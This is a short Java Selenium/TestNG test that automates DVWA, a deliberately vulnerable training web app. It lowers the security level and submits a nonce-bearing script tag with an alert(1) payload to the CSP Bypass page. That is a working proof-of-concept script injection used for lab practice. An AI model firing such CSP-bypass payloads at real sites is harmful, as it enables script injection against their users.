package testcase;

import org.openqa.selenium.By;
import org.openqa.selenium.support.ui.Select;
import org.testng.annotations.Test;

import base.BaseTest;

public class Test5CSPBypass extends BaseTest{
	
	@Test
	public void CSPBypassLow() throws InterruptedException {
	driver.findElement(By.linkText("DVWA Security")).click();
	Select drpCountry = new Select(driver.findElement(By.name("security")));
	drpCountry.selectByValue("low");
	driver.findElement(By.name("seclev_submit")).click();
	System.out.println(driver.getCurrentUrl());
	
	driver.findElement(By.linkText("CSP Bypass")).click();
	driver.findElement(By.name("include")).sendKeys("<script nonce=\"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\">alert(1)</script>");
	driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/input[2]")).click();
	Thread.sleep(500);
	
	}
}
